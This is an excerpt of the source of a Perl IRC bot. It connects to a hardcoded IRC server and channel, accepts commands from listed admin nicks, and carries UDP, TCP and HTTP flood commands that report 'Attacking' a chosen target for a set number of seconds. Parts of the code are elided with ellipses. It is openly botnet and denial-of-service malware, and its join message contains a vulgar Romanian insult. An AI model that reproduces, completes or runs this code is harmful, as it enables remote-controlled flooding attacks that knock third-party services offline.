...
## my @rrealname = ("4,1[ #LinuX help la puloc ]",
## 				    "4,1 /!\ #LinuX help la puloc /!\ ",
##				    "12,1<///8,1///4,1###>",
##                  "2,1---=== 4,1 #LinuX help la puloc 2,1===---");
...
$server = 'camel.irc.so' unless $server;
my $port = '6667';
...
my $homedir = "/tmp";
my $version = '#Linux-Help puloc versiunea 0';

my @admins = ("EasyE","Scula","Erix" );
my @hostauth=("Scula.gov","EasyE.jpl","hacker.pro");
my @channels = ("#hacklife");
...
sub parse {
  ...
  foreach my $canal (@channels) {
	sendraw("MODE $nick +x");
    sendraw("JOIN $canal");
	sendraw("PRIVMSG $canal :4,1[_?_] 9,1Gata esti fraer , Acum baga-l la mata in pizda de  boot =))");
}
}
}
...
if ($funcarg =~ /^help/) {
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Linux-Help PerlBot Main Help:  ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1======================= ");
...
if ($funcarg =~ /^version/){
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Creator : 12PRG                 ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1*Bot Year    : 122013                ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Version] 9,1================================== ");
}

if ($funcarg =~ /^flood/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Linux-help PerlBot Flood Help: ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1========================================= ");
...
if ($funcarg =~ /^channel/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Linux-Help PerlBot Channel Help:     ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1============================= ");
...
if ($funcarg =~ /^utils/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1Linux-Help PerlBot Utils Help:                            ");
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [Help] 9,1================================================== ");
...
if ($funcarg =~ /^udp1\s+(.*)\s+(\d+)\s+(\d+)/) {
    ...
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 PRG] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
    ...
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-1 PRG] 9,1Attack for 12".$1." 9,1finished in 12".$dtime." 9,1seconds9,1. ");
}
##############
if ($funcarg =~ /^udp2\s+(.*)\s+(\d+)\s+(\d+)/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-2 PRG] 9,1Attacking 12".$1." 9,1with 12".$2." 9,1Kb Packets for 12".$3." 9,1seconds. ");
...
if ($funcarg =~ /^udp3\s+(.*)\s+(\d+)\s+(\d+)/) {
    ...
    my $fim = time + $dtime;
    my $pacota = 1;
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 PRG] 9,1Attacking 12".$1." 9,1On Port 12".$porta." 9,1for 12".$dtime." 9,1seconds. ");
	while (($pacota == "1") && ($pacotes == "1")) {
            $pacota = 0 if ((time >= $fim) && ($dtime != "0"));
		...
		$pacotese/1024;		
    sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [UDP-3 PRG] 9,1Results 12".$pacotese." 9,1Kb in 12".$dtime." 9,1seconds to 12".$1."9,1. ");
}
##############

##############
if ($funcarg =~ /^tcp\s+(.*)\s+(\d+)\s+(\d+)/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [TCP PRG] 9,1Attacking 12".$1.":".$2." 9,1for 12".$3." 9,1seconds. ");
	my $itime = time;
	my ($cur_time);
	$cur_time = time - $itime;
	while ($3>$cur_time){
	...
	sendraw($IRC_cur_socket,"PRIVMSG $printl :4,1 [TCP PRG] 9,1Attack ended on: 12".$1.":".$2."9,1. ");
}
##############
if ($funcarg =~ /^http\s+(.*)\s+(\d+)/) {
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1[HTTP PRG] 9,1Attacking 12".$1." 9,1on port 80 for 12".$2." 9,1seconds. ");
	my $itime = time;
	my ($cur_time);
	$cur_time = time - $itime;
	while ($2>$cur_time){
	...
	sendraw($IRC_cur_socket, "PRIVMSG $printl :4,1 [HTTP PRG] 9,1Attacking ended on: 12".$1."9,1. ");
}
##############
